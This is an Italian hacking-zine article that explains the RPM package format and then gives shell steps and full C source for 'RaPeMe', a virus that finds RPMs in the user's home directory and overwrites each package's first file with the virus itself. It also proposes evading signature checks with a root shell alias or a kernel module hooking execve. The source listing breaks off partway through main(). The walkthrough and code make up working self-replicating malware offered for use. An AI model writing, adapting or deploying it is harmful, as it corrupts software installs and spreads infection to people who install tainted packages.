---[ RaPeMe : RPM infection 
-----[ sbudella <sbudella@libero.it>

***** Sommario.

- Intro;
- RPM, o meglio come fottere l'ordine del tuo sistema con le
  dipendenze di pacchetto;
- RPM pregnancy over : defecating the archive payload;
- RPM brutal disfigurement;
- Stripped, RaPed and strangled;
- A lethal dose of C programming hatred;
- Conclusione;
- Saluti;
- Riferimenti.  

***** Intro.

Tutti gli utenti linux sanno che portare a termine un attacco virale su
questo sistema non e' cosa semplice, grazie a meccanismi di sicurezza
implementati nativamente in esso. Il piu' classico degli ELF virus
cerchera' di infettare dei file binari che usualmente sono collezionati
nelle comunissime e blindatissime (ma non troppo) /usr/bin, /bin e via
cosi'. Per un'analisi piu' approfondita di questo genere di virus dai una
spulciata all'articolo di vecna su BFi[1] e l'ampia documentazione fornita
da silvio cesare[2].  E' superfluo comunque notare che solitamente il
software su linux viene "smerciato" via internet tramite appositi servizi
quali sourceforge.net che lo confezionano sottoforma di pacchetti sorgente
o binari. E' quindi molto poco comune vedere dei file binari (perdipiu'
del tipo piu' sputtanato quale ls ps ecc) viaggiare come allegati email
o altro, e quindi come mezzo vincente di infezione, ridimensionando
non poco il potenziale di un virus ELF. I piu' diffusi sistemi di
pacchettizzazione nel mondo linux sono senza ombra di dubbio quello
usato dalla distribuzione Debian, e RPM implementato da Red Hat ed oggi
comunemente (ab)usato da un troiaio di distribuzioni desktop-oriented.
Questo stupido ed inutile articolo cerchera' pertanto di spiegare il modo
di infettare questi ultimi pacchetti, mostrando qualche pezzo di codice
C cretino ma efficace. Percio' se puoi evitare di leggere evita.
Sei stato avvisato. Il tempo e' oro.

***** RPM, o meglio come fottere l'ordine del tuo sistema con le
      dipendenze di pacchetto.

I pacchetti RPM sono gestiti sui sistemi che li implementano da
pastrocchiosi programmi gui che altro non sono che front end al
cosidetto rpm package manager.  Questa utility e' niente piu' che
un programma per installare e rimuovere i pacchetti e soprattutto
interrogare il database del software precedentemente installato sul
sistema. In realta' fa molto di piu' ;-) , e lo fa utilizzando le piu'
comuni funzioni fornite da librpm. Inutile dire che rpm puo' essere ormai
trovato su quasi tutti i sistemi che non lo implementano nativamente,
permettendoci di lavorare scomodamente anche su altre distro.  Comunque,
man rpm(8) oppure una distratta occhiata a rpm developer guide[3] per
una veloce descrizione di queste funzioni. I programmatori del sistema
RPM ti diranno sempre di maneggiare i file rpm con queste funzioni di
libreria, ma questo non va bene per un virus. Useremo il formato del
file in veste raw, caro amico mio.  Un file rpm e' composto da alcune
aree dati, ovvero (elencate in ordine) : lead, signature, store, header
ed in fine l'archivio. Tutte tranne la prima sono una implementazione
di una struttura dati chiamata header structure.  Fortunatamente per te
non e' necessario comprendere tutta questa merda, ti basta solo sapere
che la parte alla quale siamo interessati e' proprio l'ultima, cioe'
l'archivio dove sono memorizzati tutti i file da installare. Dovremo in
effetti infettare questi per riuscire nel nostro sporco compito. Pero'
ripensandoci un attimo ci interessa anche il lead, ovvero la prima
struttura che si incontra nel formato e che tra le altre cose fornisce
utili informazioni sulla natura interna degli rpm.  Quindi per prima
cosa identifichiamo le nostre potenziali vittime :

$ file host.rpm
host.rpm: RPM v3 bin i386 ncftp-3.0.3-3
$

Come puoi vedere, l'utility file ci riporta le
essenziali del nostro rpm cavia.  Possiamo fare lo stesso semplicemente
leggendo i suoi primi 96 byte.  Infatti queste informazioni generali sono
immagazinate tutte nella sopra citata struttura lead. Dai un'occhiata
al seguente codicillo :

<-| RaPeMe/example01.c |->

#include <stdio.h>

/* questa e' la struttura lead come e' stata 
   definita nel rpm file format */
struct rpmlead {
	unsigned char magic[4];
	unsigned char major, minor;
	short type;
	short archnum;
	char name[66];
	short osnum;
	short signature_type;
	char reserved[16];
};

main()
{
	FILE *inp = fopen("host.rpm","r");
	struct rpmlead lead;
	int i;

	fread(&lead,sizeof(struct rpmlead),1,inp);

	printf("0x");

	for(i = 0;i < 4;i++)
		printf("%x",lead.magic[i]);

	printf("\n%x.%x %x %s\n",lead.major,lead.minor,
		lead.type,lead.name);

	fclose(inp);

	return 0;

}

<-X->

$ gcc -o lead example01.c
$ ./lead
$ 0xedabeedb 3.0 0 ncftp-3.0.3-3mdk
$

Il programmino stampa a video le stesse informazioni, naturalmente
in veste grezza. Come avrai capito 0xedabeedb e' il magic number
che identifica un rpm ed e' memorizzato nei primi quattro byte della
struttura. I successivi due byte sono major e minor e sono riservati
per la versione del sistema rpm in uso.  Per noi e' molto importante il
membro chiamato type : questa informazione, lunga anch'essa due byte,
specifica il tipo dell'archivio; infatti possiamo trovarci difronte a due
comuni tipi di rpm : binario e sorgente. Se type e' uguale a 0x00 abbiamo
un pacchetto contenente il software in forma binaria; nel caso type sia
uguale a 0x01 abbiamo un pacchetto contenente dei sorgenti. Nel nostro
caso abbiamo un tipo binario. Per quanto riguarda il nome del pacchetto,
ad esso sono riservati 66 byte. Gli altri membri non ci interessano.
Cosi' adesso abbiamo qualche utile accenno su come identificare le
nostre vittime su di un sistema : ci bastera' leggere almeno i suoi
primi otto byte affinche' possiamo controllare il magic number ed il
tipo di archivio. Nient'altro ci serve.

***** RPM pregnancy over : defecating the archive payload.

Come ho detto prima, a noi interessa la parte contenente i binari/sorgenti
del rpm, ovvero l'archive payload. Per prima cosa, una buona notizia
per te, se sei un pigro come il sottoscritto : i file nell'archivio sono
compressi con gzip.  Cosi' ora possiamo semplicemente estrarre il payload
dopo aver localizzato il magic number di gzip nel rpm, che sappiamo essere
uguale a 0x1f8b08; quindi adesso lancia biew e cercalo... ma aspetta un
attimo... qualcuno ci ha reso le cose piu' semplici : possiamo usare il
programmilo rpmoffset[4] come mostrato di seguito.

$ rpmoffset < host.rpm
5795
$

Ti stai chiedendo cos'e' quel numerino? E' l'offset a partire dal quale
comincia l'archivio gzippato. Possiamo dunque estrarlo usando un po'
di lavoro di shell.

$ dd if=host.rpm of=host.cpio.gz ibs=1 skip=`rpmoffset < host.rpm`
457369+0 records in
893+1 records out
$

rpmoffset e' un piccolo programma che sputa fuori l'offset per noi e
quindi, da bravi pigri quali siamo, lo possiamo incorporare nel nostro
virus per compiere questo compito infame.  Adesso usiamo gunzip e
investighiamo ulteriormente la natura dell'archivio.

$ gunzip host.cpio.gz
$ file host.cpio
host.cpio: ASCII cpio archive (SVR4 with no CRC)
$

Ma che diavolo e' un archivio cpio? Bene, e' semplicemente un tipo di
archivio proprio come tar, ed e' molto facile reversarlo; comunque
se fai una ricerca su google troverai un'infinita' di documenti che ne
descrivono il formato.  Molto brevemente, ogni archivio cpio riserva un
header per ogni file contenuto in esso; l'header mantiene informazioni
generali riguardo il file in questione come l'inode number, il file mode,
uid, gid e la lunghezza del file; tutte queste informazioni sono grosso
modo compatibili con quelle riportate dalla chiamata di sistema stat e
subiscono il padding degli zeri sulla sinistra.  Ogni header inizia sempre
con il magic number 070707. (Il padding, nel nostro virus, viene fatto
in maniera poco ortodossa... tuttavia efficacemente).  Ogni archivio
cpio termina con un header descrivente un file vuoto, seguito dalla
stringa TRAILER!!!.  E' inoltre importante dire che i file archiviati non
subiscono nessuna compressione se non quella di gzip, e nel nostro caso
(no CRC) non abbiamo nessun checksum... Cosa vuol dire tutto cio'? Beh,
basta aprire il file in questione con un semplice editor di testo per
capire : possiamo vedere i file memorizzati nel payload in chiara forma
binaria! Quindi non abbiamo ulteriori complicazioni! Infatti nel caso
decidessimo di infettare archivi binari, abbiamo la strada spianata e
possiamo utilizzare qualsiasi metodo di ELF infection trito e ritrito
come se operassimo su un semplice ELF sul nostro file system.  Nel caso
volessimo incasinare i sorgenti, ci basterebbe individuare all'interno del
cpio la funzione main() ed inserirci una chiamata al virus, che intanto
si e' accodato all'archivio, oppure potremmo copiare completamente il
suo sorgente come farebbe un quine. Ma quanto siamo cattivi...  Ok,
adesso abbiamo l'archivio... ma qual e' il nostro piano di infezione?

***** RPM brutal disfigurement.

Il nostro piano? Localizzare il primo file nel cpio e sovrascriverlo con
il nostro virus, proprio come farebbe un vecchio .com overwrite virus,
cosicche' venga installato(ed in seguito eseguito) questo al suo posto.
E adesso posso sentirti esclamare : ma che katz! cosi' distruggeremo
irreversibilmente il file! E chissenefrega! Scherzi a parte, ribadisco
che questo non e' un tutorial sui virus ELF ;-), ma sull'infezione RPM,
quindi se vuoi tutelare sindacalmente l'integrita' dei file ti conviene
dare una lettura ai relativi articoli nella bibliografia. Comunque ricorda:
come ho detto prima, possiamo implementare qualsiasi tipo di infezione
vogliamo, cosa da fare assolutamente se non vogliamo triturare i nostri
rpm, e sopratutto se vogliamo avere vita lunga sul sistema, evitando
prevedibili sgamature. In ogni caso, il virus presentato in questo
articolo effettua una copia preventiva in /tmp di tutte le vittime, prima
di infettarle, cosi' possiamo vivere felici e contenti.  Dopo tutto questo
sermone, vediamo di darci una mossa ;-) Diamo un'occhiata all'header del
primo file archiviato nel cpio : esso misura 110 byte, ovvero tanti sono
i byte che dovremo analizzare prima che inizi il nome del primo file.

$ head -c 110 host.cpio
070701001f332f000081ed0000000000000000000000013b8e12320003311c000000080000001100
000000000000000000001000000000
$

Quali sono le informazioni piu' utili per il nostro virus? 0x3311c e' la
lunghezza del file e l'ultima cifra significativa (0x10) e' la lunghezza
del nome del primo file. Nel nostro esempio, il file in questione e'
/usr/bin/ncftp, la cui grandezza e' appunto 209180 byte ed il cui nome e'
lungo... 14 byte?  Beh, se controlli bene il cpio, davanti al nome c'e'
un '.' ; inoltre dobbiamo aggiungerci il null byte di coda... cosi'
siamo a 16 byte...  Quindi se stai seguendo l'infame metodo di infezione
RaPeMe pianificato prima, devi sostituire al tag della lunghezza del
file (0x3311c) la grandezza del virus.  Se hai optato per un qualsiasi
metodo di ELF infection, devi semplicemente incrementare quel tag della
dimensione del virus. (Ricorda comunque di fare il padding di tutti i tag
ritoccati nell'header). A questo punto ipotizziamo che il nostro virus e'
uno stupido programma hello world grande 0x2958 byte. Rinominalo con un
qualsiasi nome lungo 0x10 - 1. Adesso creiamo un archivio cpio contenente
il virus (questo escamotage e' solo un esempio per ottenere un header
in modo veloce, senza ricorrere a stat, nel virus faremo diversamente).

$ echo azxcvbnmlkjhgfd | cpio -O virus.cpio -H newc -o 
$

Apriamo virus.cpio con un editor di testo (spero tu stia usando vi ;-)
e facciamo qualche ritocco : sostituiamo il nome fasullo con
quello del primo file del cpio estratto dal rpm, nel nostro caso
./usr/bin/ncftp . Ora cancelliamo completamente l'header di coda e
la stringa TRAILER!!!. Quindi non ci resta che aprire host.cpio ed
eliminare ogni riferimento al primo file, senza pieta' : esattamente
dovremo rimuovere l'header, il nome del primo file e lo stesso file (
in tutto sono first file size + header size + first file name length
bytes). Siamo arrivati quasi alla conclusione :

$ cat virus.cpio host.cpio > new.cpio
$ gzip new.cpio
$

Adesso abbiamo un archivio cpio che assomiglia all'originale, pero'
infettato dal temibilissimo hello world, che prende il posto del
povero /usr/bin/ncftp. Ricomponiamo il nostro rpm nel seguente modo : 

$ dd if=host.rpm of=host.head ibs=1 count=`rpmoffset < host.rpm`
5795+0 records in
11+1 records out
$ cat host.head new.cpio.gz > new.rpm
$ cp host.rpm /tmp
$ mv new.rpm host.rpm
# rpm -i host.rpm --force --nodeps --nosignature --nomd5 --nodigest 
$ ncftp
Hello, Fucking World!
$

***** Stripped, RaPed and strangled.

Il nostro virus codato in C dovra' automatizzare tutte le porcate che
abbiamo fatto fino ad ora. Pero' posso sentirti formulare una giusta
obiezione : c'e' un grosso problema irrisolto nell'installare un rpm
infetto su un sistema pulito.  Infatti e' strettamente necessario passare
a rpm(8) le ultime tre opzioni, quelle relative alla signature (--force e
--nodeps invece sono per chi come me non ha un database di software rpm,
i.e. chi non usa Red Hat & co). Nel caso tu ancora non lo sapessi, ogni
pacchetto RPM porta con se della informazioni quali un sum md5, gpg,
o altro, oltre a un banale check sulle dimensioni dei file, ovvero
tutti quei controlli effettuati prima di installare anche un solo byte
nelle directory di sistema. Se anche un singolo controllo fallisce,
l' rpm non viene installato. Tuttavia e' possibile procedere ugualmente
forzando il package manager con le opzioni illustrate sopra. Tutta 
questa bella roba e' immagazinata nello store, che e' un'area dati addetta
a contenere tutte le schifezze indicate nell'header e nella signature
area. Mi spiego.  Subito dopo il lead, troviamo la signature area,
che come gia' detto e' una struttura header composta di diverse index
entry ( di solito 3). Ogni entry nella signature fa riferimento ad un
tipo di check impiantato nel file rpm. Analizziamo il nostro host.rpm,
per chiarezza : abbiamo detto che il lead misura 0x60 byte e quindi la
nostra signature area comincera' da quest'offset. Apriamo biew :

00000060: 8E AD E8 01 00 00 00 00 00 00 00 03 00 00 00 55

Ogni struttura di tipo header ha sempre come magic number 0x8eade8, e
la nostra signature non fa eccezione. Il byte successivo e' la versione
in uso della header structure; i quattro byte posti uguale a zero sono
riservati per usi futuri.  Gli altri quattro byte seguenti indicano
il numero di entry nella signature, in questo caso 3. 0x00000055 sono
il numero di byte riservati alla signature nello store. Infatti ogni
entry, lunga 16 byte, punta ad una parte nello store, che come accennato
immagazzina i dati puntati.

00000080: 00 00 03 EC 00 00 00 07 00 00 00 04 00 00 00 10

Quella che stai vedendo e' la seconda entry della sig area (0x60 + 0x10
*2).  I primi quattro byte (0x000003ec = 1004) sono il tag descrivente
il tipo di signature utilizzata per proteggere l' rpm. Un'occhiata
a /usr/include/rpm/rpmlib.h ci dice che 1004 corrisponde al tag
RPMSIGTAG_MD5, quindi il nostro secondo signature e' un noiosissimo
checksum md5. 0x00000007 e' il tag indicante il tipo di dato puntato nello
store (corrispondente in questo caso al tipo binario). I quattro byte
seguenti (0x00000004) dicono che il checksum comincia quattro byte dopo
l'offset di inizio dello store, che puo' essere trovato all'offset 0xa0
( 0x3 * 0x10 + 0x70, quest'ultimo e' il primo index entry offset). 0x10
indica la dimensione del checksum nello store. Bene, andiamo all'offset
0xa0 + 0x4 = 0xa4 e troviamo il nostro fottutissimo checksum. Possiamo
applicare lo stesso procedimento alla terza index entry nella signature
area ed accorgerci che l'altro tipo di controllo effettuato ha tag uguale
a 0x3ed = 1005 = RPMSIGTAG_GPG... Brutta storia amico mio, davvero
una gran brutta storia. Il mio cervellino stanco mi dice che forse un
tentativo per fottere rpm --checksig (ovvero il controllo della signature)
potrebbe essere ricalcolare il checksum md5 e sostituirlo nel rpm...
Ma md5 checksum di che cosa? Beh, l' rpm file format ci accenna che le
parti sottoposte all'algoritmo per ottenere il sum sono il package file
header e l' archive payload. Quindi un ipotetico virus superdotato di
tanta forza di volonta' potrebbe calcolare l'md5 di queste parti del rpm
infetto e sostituirlo nello store. Pero' e' mio dovere dirti che questa
feature non e' stata implementata nel virus RaPeMe proposto qui, anche
perche' non l'ho ancora provata! Se sei un'anima pia molto ferrata ;-)
in materia di algoritmi di hash, potresti approfondire l'argomento... Io,
personalmente, trovo che il problema del controllo della signature possa
essere aggirato "semplicemente" (si fa per dire) da un exploit che ci
faccia il favore di renderci root sulla macchina, cosi' da installare
un banale alias nel .bashrc del root (ammesso che usi bash) del tipo :

alias rpm="rpm --force --nodeps --nosignature --nomd5 --nodigest"

Oppure, soluzione molto piu' potente e bastarda, installare un lkm che
faccia l'hook della sys_execve ed un controllo sugli argomenti passati
a rpm(8), cosi' da accodarvici le opzioni in questione. Se stai pensando
che :

$ rpm --resign host.rpm
host.rpm:
$

sia un'altra soluzione degna di questo nome, beh... la risposta e' 
un grosso e grasso no!

***** A lethal dose of C programming hatred.

Bene, come da copione, ti presento il codice del virus RaPeMe, da
me codato in sessioni mordi e fuggi alla tastiera, accompagnato da
ottima musica metal. Ti consiglio di spulciarlo attentamente, anche
perche' ci sono un sacco di feature non discusse fino ad ora,
e piccoli accorgimenti e trucchetti, tutte cose senza le quali sarebbe
stato solo un altro insensato virus per linux. Se pensi che sia il
codice piu' penoso, lento ed inefficiente della storia, posso darti
ragione solo se non rientri tra le vittime di quel simpatico disturbo 
che chiamano pigrizia. Buon divertimento.

<-| RaPeMe/hunt.c |->

/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : sbudella@libero.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon, that is to say your karma will
		be affected negatively by your acts.
========== */



#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include "hunt.h"

char *global_buf;
char target_name[FILENAME_MAX];

/*===== 
	find rpm in the given directory
=====*/
FILE *search_target(char *path,int path_size)
{	
	struct dirent **file_list;
	struct stat *buf; 
	int n,new_path_size;
	char *new_path;
	FILE *target;
	unsigned char magic_stuff[8];		/* magic,version,type*/ 

	buf = malloc(sizeof(struct stat));
	if(!buf) {
		perror("malloc");
		exit(1);
	}
	memset(buf,0,sizeof(struct stat));

	if(stat(path,buf) < 0) {
		perror("stat");	
		printf("%s\n",path);
		exit(1);
	}

	n = scandir(path,&file_list,0,alphasort);
	if(n < 0) {
		perror("scandir");
		exit(1);
	} 
	else {
		while(n--) {
			/* generate the new path */ 
			new_path_size = path_size + file_list[n]->d_reclen;
			new_path = malloc(new_path_size);
			if(!new_path) {
				perror("malloc");
				exit(1);
			}

			memset(new_path,0,new_path_size);
			strncpy(new_path,path,path_size);
			new_path[path_size] = '/';
			strncat(new_path,file_list[n]->d_name,file_list[n]->d_reclen);

			if(stat(new_path,buf) < 0) {
				perror("stat");
				printf("%s\n",new_path);
				exit(1);
			}

			/* regular file, check the magic number */
			if(S_ISREG(buf->st_mode)) {
				target = fopen(new_path,"r");
				if(!target) {
					perror("fopen");
					exit(1);
				}
				
				fgets(magic_stuff,sizeof(magic_stuff),target);
				rewind(target);
				
				/* further improvement: add a check for already infected files */
				if(magic_stuff[0] == 0xed && magic_stuff[1] == 0xab &&
				magic_stuff[2] == 0xee && magic_stuff[3] == 0xdb &&
				magic_stuff[6] == 0x00 && magic_stuff[7] == 0x00) {
					strncpy(target_name,new_path,new_path_size);
					free(file_list);
					free(new_path); 
					return target; 
				}
		
				else continue; 

			}
			
			free(file_list[n]);

		}

		free(file_list);
		free(new_path);

	}

//	return NULL;
	exit(1);

}
			

/*=====
	this is a modified version of rpmoffset.c from
	http://darkstar.ist.utl.pt/slackware/slackware-8.1/patches/source/bin/rpmoffset.c
	get the offset where the archive payload begins 
=====*/		  
unsigned long get_rpm_offset(FILE *rpm)
{
	char *buf,*eb,*p;			
	
	buf = malloc(RPM_BUF_SIZE);
	if(!buf) {
		perror("malloc");
		exit(1);
	}

	for(p = buf,eb = buf + read(fileno(rpm),buf,RPM_BUF_SIZE);p < eb;p++)
		if(*p == '\037' && p[1] == '\213' && p[2] == '\010')
			return (p - buf);

}


/*=====
	extract the archive payload from the rpm
	then gunzip it using system()
=====*/ 
FILE *get_rpm_archive(FILE *rpm,unsigned long rpm_offset)
{
	unsigned long rpm_size; 
	FILE *arch =  fopen(TMP_ARCHIVE_NAME_GZ,"w");
	if(!arch) {
		perror("fopen");
		exit(1);
	}

	fseek(rpm,0,SEEK_END);
	rpm_size = ftell(rpm);

	fseek(rpm,rpm_offset,SEEK_SET);

	while(rpm_size-- != 0)
		putc(getc(rpm),arch);
	
	fclose(arch);

	system(GUNZIP_ARCHIVE);

	arch = fopen(TMP_ARCHIVE_NAME,"r");

	return arch;

}
	

/*=====
	my buggy version of pow() 
=====*/
unsigned long my_pow(unsigned long a,unsigned long b)
{
	unsigned long t = 1;
	
	if(a == 0)
		return 0;
	if(a == 1)
		return 1;

	while(b-- > 0)
		t *= a;

	return t;

}


/*=====
	get specific informations from the cpio header
=====*/
unsigned long get_cpio_header_info(FILE *cpio,int header_offset,int info_size)
{
	char buf[info_size];
	int i,j,tmp[info_size];
	unsigned long tot = 0;

	fseek(cpio,header_offset,SEEK_SET);
	fgets(buf,info_size + 1,cpio);

	for(i = 0,j = info_size - 1;i < info_size,j != -1;i++,j--) {
		if(isalpha(buf[i]))
			tmp[i] = (buf[i] - 87) * my_pow(16,j);
		else
			tmp[i] = (buf[i] - 48) * my_pow(16,j);

		tot += tmp[i];

	}

	return tot;

}	


/*=====
	nothing to be said here
=====*/	
char *get_cpio_first_file_name(FILE *cpio,int file_name_len)
{
	global_buf = malloc(file_name_len);

	fseek(cpio,CPIO_FIRST_FILE_NAME_OFFSET,SEEK_SET);
	fgets(global_buf,file_name_len,cpio);

	return global_buf;

}

<-X->

<-| RaPeMe/hunt.h |->

/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : sbudella@libero.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon, that is to say your karma will
		be affected negatively by your acts.
========== */



#include <stdio.h>

#define RPM_BUF_SIZE					2097152
#define TMP_ARCHIVE_NAME_GZ				"/tmp/.tmp.cpio.gz"
#define TMP_ARCHIVE_NAME				"/tmp/.tmp.cpio"
#define GUNZIP_ARCHIVE					"gunzip /tmp/.tmp.cpio.gz 1 2>/dev/null"
#define CPIO_FIRST_FILE_SIZE_OFFSET			54
#define CPIO_FIRST_FILE_NAME_LEN_OFFSET			100	
#define CPIO_FIRST_FILE_NAME_OFFSET			110

FILE *search_target(char *path,int path_size);
unsigned long get_rpm_offset(FILE *rpm);
FILE *get_rpm_archive(FILE *rpm,unsigned long rpm_offset);
unsigned long my_pow(unsigned long a,unsigned long b);
unsigned long get_cpio_header_info(FILE *cpio,int header_offset,int info_size);
char *get_cpio_first_file_name(FILE *cpio,int file_name_len);

<-X->

<-| RaPeMe/infect.c |->

/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : sbudella@libero.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon, that is to say your karma will
		be affected negatively by your acts.
========== */



#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include "infect.h"
#include "hunt.h"

/*=====
	make an infected cpio arch:
	the first file is the virus replacing the orig first file
	and the rest is untouched
=====*/
FILE *prepare_virus_cpio(FILE *cpio,char *cpio_first_file_name,int cpio_first_file_name_len,
			unsigned long cpio_first_file_size)
{
	FILE *me,*my_tmp;
	pid_t my_pid;	
	char my_tmp_name[128],my_name[128],my_proc_name[128],ily[128];
	unsigned long my_size,tampax,cpio_size;
	int i,k;		

	/* get your pid and read your executable name from /proc/PID */
	my_pid = getpid();

	strncpy(my_proc_name,PROC_DIR_TAG,sizeof(PROC_DIR_TAG));
	sprintf(ily,"%d",my_pid);
	strncat(my_proc_name,ily,sizeof(ily));
	strncat(my_proc_name,PROC_CMD_TAG,sizeof(PROC_CMD_TAG));

	/* first use my_tmp for proc file */
	my_tmp = fopen(my_proc_name,"r");
	if(!my_tmp) {
		perror("fopen");
		exit(1);
	}

	/* get virus name*/
	fgets(my_tmp_name,sizeof(my_tmp_name),my_tmp);	
	if(my_tmp_name[0] == '.')
		for(i = 0,k = 2;i < sizeof(my_tmp_name);i++,k++)
			my_name[i] = my_tmp_name[k];			

	else strncpy(my_name,my_tmp_name,sizeof(my_tmp_name));

	fclose(my_tmp);

	/* open the virus itself and get its size */ 
	me = fopen(my_name,"r");
	if(!me) {
		perror("fopen");
		exit(1);
	}
	
	fseek(me,0,SEEK_END);
	my_size = ftell(me);
	rewind(me);

	/* now use my_tmp for the infected cpio tmp file */ 
	my_tmp = fopen(LAST_TMP,"w");
	if(!my_tmp) {
		perror("fopen");
		exit(1);
	}

	fprintf(my_tmp,"%s",CPIO_VIRUS_HEADER_1);

	/* calculate how many zeros to write in the cpio header 
		before writing virus size : infos in the cpio header
		are zero padded on the left */		  
	if(my_size > 0xfff)
		fprintf(my_tmp,"%s","0000");
	if(my_size > 0xffff)
		fprintf(my_tmp,"%s","000");
	if(my_size > 0xfffff)
		fprintf(my_tmp,"%s","00");

	/* write virus size */
	fprintf(my_tmp,"%x",my_size);
	fprintf(my_tmp,"%s",CPIO_VIRUS_HEADER_2);
	
	/* write first file name len and fill with zeros */
	fprintf(my_tmp,"%x",cpio_first_file_name_len);

	if(cpio_first_file_name_len > 0xf)
		fprintf(my_tmp,"%s","00000000");
	if(cpio_first_file_name_len <= 0xf)
		fprintf(my_tmp,"%s","000000000");

	/* write first file name*/
	fprintf(my_tmp,"%s",cpio_first_file_name);
	
	/* fill with zero : very important for the archive integrity */
	for(i = 0;i < DAMN_IT;i++)
		putc(0x0,my_tmp);

	/* write the virus */
	while(my_size-- != 0)
		putc(getc(me),my_tmp); 

	fclose(me);

	fseek(cpio,0,SEEK_END);
	cpio_size = ftell(cpio);

	/* get the rest of the original cpio archive 
           and put it into the infected one */ 
	fseek(cpio,cpio_first_file_size + CPIO_HEADER_SIZE + cpio_first_file_name_len +2,SEEK_SET);
	fflush(my_tmp);
	tampax = ftell(cpio);

	while(cpio_size-- != tampax) 
		putc(getc(cpio),my_tmp);

	/* all done */

	fclose(my_tmp);
	fclose(cpio);

	system(GZIP_ARCHIVE);

	my_tmp = fopen(LAST_TMP_GZ,"r");
	if(!my_tmp) {
		perror("fopen");
		exit(1);
	}

	return my_tmp;	
	
}

/* ==========
	Pure is we begin.
	Pure is we come in.
	Let magick come 'round,from under the ground
	To form with my sound and then to be bound.
	Let all hatred CEASE and let there be PEACE.
	PLEASE let all hatred CEASE. 
	PLEASE let there be PEACE. 
	These words that I say with magick AWAY.
	This spell that I send is now at an end. 
 	Let the magick I've laid
	Go forth and not fade.
========== */

void magick_ritual(FILE *rpm,FILE *arch,char *r_name,unsigned long rpm_offset)
{
	FILE *wicca;			/* follow the cult */
	FILE *rpm_n;
	char tmp_path[128],buf[5],eris[FILENAME_MAX];
	unsigned long arch_size,rpm_size;

	srand((unsigned int) time(NULL));

	/*generate a random number and use it as the file name
		for the orig rpm back up */		
	strncpy(tmp_path,TMP_DIR_TAG,sizeof(TMP_DIR_TAG));
	sprintf(buf,"%d",rand() % 10000);
	strncat(tmp_path,buf,sizeof(buf));
	strncat(tmp_path,".rpm",4);

	wicca = fopen(tmp_path,"w");
	if(!wicca) {
		perror("fopen");
		exit(1);
	}
	
	rewind(rpm);
	
	/* back up the orig rpm */ 
	fseek(rpm,0,SEEK_END);
	rpm_size = ftell(rpm);
	fflush(rpm);	
	rewind(rpm);

	while(rpm_size-- != 0)
		putc(getc(rpm),wicca);

	fclose(wicca);

	rpm_n = fopen(tmp_path,"r");
	if(!rpm_n) {
		perror("fopen");
		exit(1);
	}

	wicca = fopen(r_name,"w");
	if(!wicca) {
		perror("fopen");
		exit(1);
	}

	/* copy the rpm header */ 
	while(rpm_offset-- != 0)
		putc(getc(rpm_n),wicca);

	fseek(arch,0,SEEK_END);
	arch_size = ftell(arch);
	fflush(wicca);
	fflush(arch);
	rewind(arch);

	while(arch_size-- != 0)
		putc(getc(arch),wicca);

	fclose(wicca);
	fclose(rpm_n);

	/* resign the infected rpm, 
	commented for black magic mistery reason
	strncpy(eris,RPM_RESIGN,sizeof(RPM_RESIGN));
	strcat(eris,r_name);
	strncat(eris,DEV_NULL_OUT,sizeof(DEV_NULL_OUT));
	
	system(eris);
	*/

	/* remove every unnecessary file */

	unlink(LAST_TMP_GZ);
	unlink(TMP_ARCHIVE_NAME);
	
}

<-X->

<-| RaPeMe/infect.h |->

/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : sbudella@libero.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon,that is to say your karma will
		be affected negatively by your acts.
========== */



#define PROC_DIR_TAG					"/proc/"
#define PROC_CMD_TAG					"/cmdline"
#define LAST_TMP					"/tmp/.ultimate.cpio"
#define LAST_TMP_GZ					"/tmp/.ultimate.cpio.gz"
#define GZIP_ARCHIVE					"gzip /tmp/.ultimate.cpio"
#define CPIO_VIRUS_HEADER_1				"0707010185892b000081ed0000000000000000000000013f8d7ebd"
#define CPIO_VIRUS_HEADER_2				"00000003000000060000000000000000000000"
#define CPIO_HEADER_SIZE				110	
#define DAMN_IT						4	
#define TMP_DIR_TAG					"/tmp/"
#define RPM_RESIGN					"rpm --resign "
#define DEV_NULL_OUT					" >/dev/null" 

FILE *prepare_virus_cpio(FILE *cpio,char *cpio_first_file_name,int cpio_first_file_name_len,
			unsigned long cpio_first_file_size);

void magick_ritual(FILE *rpm,FILE *arch,char *r_name,unsigned long rpm_offset);
	
<-X->

<-| RaPeMe/main.c |->

/*==========
	RaPeMe, the first RPM infector/virus ever 
	and also a powerful chaos magick spell.
	Please use it with caution.

	author : sbudella;
	contact : sbudella@libero.it;
	date : 1 May 2006 - 22 May 2006;
	description : read the README file;
	copyright : read the LICENSE file; 

	notes : "an it harm none, do as thou wilt" 
		If you damage any system using this
		code you will be facing The Law of Return
		soon, that is to say your karma will
		be affected negatively by your acts.
========== */



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "hunt.h"
#include "infect.h"

extern char target_name[FILENAME_MAX];

int main()
{
	unsigned long offset,ff_size;
	FILE *rpm,*arch,*new_arch; 
	int ff_file_name_len;
	char *ff_name,*home_dir;

	home_dir = getenv("HOME");	

	rpm = search_target(home_dir,strlen(home_dir));

	offset = get_rpm_offset(rpm);

	arch = get_rpm_archive(rpm,offset);

	/* get first file size from cpio header*/ 
